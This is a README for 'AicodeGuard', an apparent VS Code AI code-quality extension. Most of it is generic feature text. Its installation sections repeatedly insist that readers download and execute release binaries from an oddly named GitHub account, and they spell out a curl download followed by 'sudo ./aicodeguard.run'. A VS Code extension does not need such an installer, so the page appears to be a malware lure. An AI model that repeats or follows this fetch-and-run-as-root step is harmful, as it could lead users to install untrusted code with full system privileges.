AicodeGuard — Real-time VS Code AI Code Quality Enforcement
===========================================================

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Shaziwarits1/AicodeGuard/releases)  
https://github.com/Shaziwarits1/AicodeGuard/releases

![VS Code](https://code.visualstudio.com/assets/images/code-stable.png)

What AicodeGuard does
---------------------

AicodeGuard monitors code as you type in VS Code. It detects issues in real time, blocks critical saves, and communicates with AI assistants to keep code production-ready. It enforces rules, prevents regressions, and integrates with your CI pipeline.

Key benefits
- Detect issues inside the editor before commit.
- Block saves for critical security or correctness failures.
- Query AI assistants for suggested fixes and rationale.
- Apply team rule sets and baseline checks.
- Export reports for audits and CI gates.

Features
--------
- Real-time linting and static analysis with low latency.
- Save-time enforcement: prevent saves that fail critical checks.
- AI assistant integration: request fix suggestions and explainers.
- Rule sets: built-in rules for security, style, performance, and tests.
- Custom rules: write rules as TypeScript or Lua plugins.
- Preflight checks: run quick pre-commit validations on save.
- Telemetry toggle: control what runs locally and what sends to the server.
- CLI and extension: use the VS Code extension or a headless CLI for CI.

How it works — simple flow
--------------------------
1. VS Code extension reads file events and partial edits via the Language Server Protocol (LSP).  
2. A local engine runs fast checks (syntax, lint, security patterns).  
3. For flagged items, AicodeGuard can call configured AI assistants to generate suggestions.  
4. For critical rules, the extension prevents the save and shows a block UI with a reason and a suggested patch.  
5. Users accept or edit suggestions, then re-run checks.  
6. CI can pull the same rule set and run headless CLI to enforce the same checks on the server.

Quick start
-----------
1. Install the VS Code extension from the Releases page. Download and execute the installer asset for your platform. See the Releases link below:
   https://github.com/Shaziwarits1/AicodeGuard/releases

2. Open VS Code and enable the AicodeGuard extension.

3. Open a project. AicodeGuard loads the project rule set from .aicodeguard/config.yml or from the workspace settings.

4. Edit a file. The extension will show inline diagnostics, suggestions, and a save block if needed.

Installation — download and execute
-----------------------------------
The Releases page provides platform-specific installer assets. Download the file that matches your OS and run it.

Linux/macOS example (replace asset name with the actual file):
- curl -L -o aicodeguard.run "https://github.com/Shaziwarits1/AicodeGuard/releases/download/vX.Y.Z/aicodeguard-linux-x64.run"
- chmod +x aicodeguard.run
- sudo ./aicodeguard.run

Windows example:
- Download aicodeguard-setup-x64.exe from the Releases page:
  https://github.com/Shaziwarits1/AicodeGuard/releases
- Run the EXE and follow the installer prompts.

If the release asset has a path component you must download and execute the file supplied in that release. Look for names like:
- aicodeguard-linux-x64.run
- aicodeguard-darwin-universal.pkg
- aicodeguard-setup-x64.exe

If the Releases link does not work, check the "Releases" section on this repository.

VS Code setup
-------------
- Open Extensions (Ctrl+Shift+X) and confirm AicodeGuard is enabled.
- Open Command Palette (Ctrl+Shift+P) and run "AicodeGuard: Show Dashboard".
- Configure rule sets per workspace or user settings in .vscode/settings.json:
  {
    "aicodeguard.ruleset": ".aicodeguard/config.yml",
    "aicodeguard.ai.enabled": true,
    "aicodeguard.blockOnSave": true
  }

Config file example (.aicodeguard/config.yml)
----------------------------------------------
rules:
  - id: no-hardcoded-credentials
    level: critical
    description: Detect hardcoded secrets in source files
  - id: no-sync-io-in-async
    level: warning
    description: Flag synchronous I/O inside async functions
ai:
  enabled: true
  provider: local
  model: gpt-4-mini
save:
  block_on_critical: true
  allow_on_trusted_branch: true

Rule levels
-----------
- info: shown inline, does not block saves.
- warning: requires attention before merge.
- critical: blocks save unless user overrides with a documented reason.

AI assistant integration
------------------------
AicodeGuard connects to configured AI assistants to produce code suggestions and explanations. You can choose a provider: local, private cloud, or public API.

Typical workflow:
- AicodeGuard sends a sanitized code snippet and context to the AI assistant.
- The assistant returns a suggestion or patch.
- The extension shows the suggestion in-line and in the quick fix menu.

AI configuration example:
{
  "aicodeguard.ai.provider": "local",
  "aicodeguard.ai.endpoint": "http://localhost:8080",
  "aicodeguard.ai.timeout_ms": 5000
}

CLI — use in CI
---------------
AicodeGuard ships with a headless CLI that mirrors the extension checks. You can integrate it in CI to enforce the same rules as local development.

Basic usage:
- aicodeguard scan --path ./src --rules .aicodeguard/config.yml --output report.json

Exit codes:
- 0: no failures
- 1: warnings only
- 2: critical failures (fail the build)

Examples
--------
- Block a save when a secret is detected. The extension will stop the save and show the exact line and a suggested patch that removes the secret and references a secret manager use.
- Suggest performance improvements for hot loops. The AI returns a patch and a short explanation.
- Enforce test coverage thresholds on file save. If threshold is not met, show a save block with a test stub suggestion.

Integrations
------------
- Pre-commit: run aicodeguard scan as a pre-commit hook.
- CI: run the CLI in the build pipeline and fail on critical rules.
- Issue trackers: export scans to GitHub Issues or Jira via webhook.
- SAST tools: combine AicodeGuard results with existing SAST for full coverage.

Security and privacy
--------------------
- AicodeGuard supports local-only mode where no code leaves the machine.
- AI calls can route to private endpoints under your control.
- Telemetry is opt-in per user settings.

Troubleshooting
---------------
- If diagnostics do not appear, restart VS Code and check the extension host logs.
- If AI suggestions time out, increase aicodeguard.ai.timeout_ms or switch to a local provider.
- If saves still succeed on critical rules, confirm "aicodeguard.blockOnSave" is true in workspace settings.

Diagnostics and logs
- Use "AicodeGuard: Open Logs" from the Command Palette.
- Logs store under ~/.aicodeguard/logs by default.
- Turn on debug logging with:
  {
    "aicodeguard.debug": true
  }

Performance tips
----------------
- Use local engines for low-latency checks.
- Exclude large binary folders in settings: "aicodeguard.exclude": ["node_modules", "dist"]
- Use incremental rule runs for large files.

Contributing
------------
- Fork the repository and create a feature branch.
- Follow the code style in CONTRIBUTING.md and run the test suite.
- Build the extension with npm run build.
- Open a pull request with a clear description of the change and a test case.

Project structure (high-level)
------------------------------
- src/extension — VS Code extension code and LSP glue.
- src/engine — local rule engine and analyzers.
- src/ai — AI provider adapters.
- cli/ — headless CLI used in CI.
- .aicodeguard/ — default rule sets and examples.

API and plugin model
--------------------
- Write rule plugins in TypeScript or Lua. Each plugin exports a check() function that returns diagnostics.
- The LSP accepts diagnostics from plugins and formats them into VS Code diagnostics.

Rules authoring example (TypeScript)
```ts
export function check(document: TextDocument) {
  const diagnostics: Diagnostic[] = [];
  // detect pattern
  if (document.getText().includes("password =")) {
    diagnostics.push({
      range: /* ... */,
      message: "Hardcoded password",
      severity: DiagnosticSeverity.Error,
      code: "no-hardcoded-credentials"
    });
  }
  return diagnostics;
}
```

Testing
-------
- Unit tests live in tests/.
- Run tests with npm test.
- Use the test harness to simulate editor events for live checks.

Release notes and downloads
---------------------------
Download the installer or binary matching your platform from the Releases page. The release asset must be downloaded and executed. Visit the Releases page here:
[Download AicodeGuard Releases](https://github.com/Shaziwarits1/AicodeGuard/releases)

If the release link fails, check the repository "Releases" section on GitHub.

License
-------
AicodeGuard uses an open-source license. See the LICENSE file for full details.

Maintainers
-----------
- Lead: Shaziwarits1
- Core: security, language support, AI integrations teams

Acknowledgements and images
---------------------------
- VS Code logo used from the official site.
- Shields provided by img.shields.io.

Contact
-------
Open an issue on GitHub for bugs or feature requests. Pull requests receive review per contribution guidelines.